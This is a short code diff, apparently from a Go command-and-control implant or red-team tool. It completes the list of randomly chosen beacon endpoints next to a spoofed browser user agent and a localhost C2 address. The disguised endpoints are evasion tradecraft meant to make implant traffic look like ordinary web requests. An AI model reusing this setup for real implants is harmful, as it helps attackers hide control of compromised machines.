@@ -22,4 +22,4 @@ var UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
 var CCHost = "http://127.0.0.1:8080/"
 
 // Endpoints are the endpoints in the server to which beacon. They are chosen randomly
-var Endpoints = []string{"index.php", "api/forward", "submit.
+var Endpoints = []string{"index.php", "api/forward", "submit.php", "admin/get.php", "news.php", "login/process.php"}
